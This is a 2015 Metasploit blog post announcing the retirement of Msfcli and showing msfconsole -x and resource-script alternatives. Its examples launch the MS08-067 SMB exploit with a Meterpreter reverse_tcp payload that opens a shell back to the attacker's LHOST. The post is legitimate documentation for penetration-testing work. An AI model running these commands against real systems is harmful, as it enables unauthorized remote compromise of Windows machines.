@@ -1,0 +1,45 @@
+Msfcli is no longer available in Metasploit
+Posted by sinn3r Employee in Metasploit on Jul 10, 2015 11:52:09 AM
+
+Hi everyone,
+
+ 
+
+This January, we made an announcement about the deprecation of Msfcli, the command line interface version for Metasploit. Today we are ready to say good-bye to it. Instead of Msfcli, we recommend using the -x option in Msfconsole. For example, here's how you can run MS08-067 in one line:
+
+ 
+
+    ./msfconsole -x "use exploit/windows/smb/ms08_067_netapi; set RHOST [IP]; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST [IP]; run"  
+
+ 
+
+You can also leverage things like resource scripts or even command alias to do less typing. Here's an example of how you would write a resource script to automate running MS08_067:
+
+ 
+
+    use exploit/windows/smb/ms08_067_netapi  
+    set RHOST [IP]  
+    set PAYLOAD windows/meterpreter/reverse_tcp  
+    set LHOST [IP]  
+    run  
+
+ 
+
+And then run it:
+
+ 
+
+    ./msfconsole -r name_of_resource_script.rc  
+
+ 
+
+Another way to run a resource script if you're in msfconsole already:
+
+ 
+
+    msf > resource name_of_resource_script.rc  
+
+ 
+
+If you have any questions, please feel free to create a discussion on SecurityStreet, or e-mail us at msfdev[at]metasploit.com. To submit a bug report or feature request, please go to Metasploit's Github repository. Thanks!
+11311 Views Tags: 
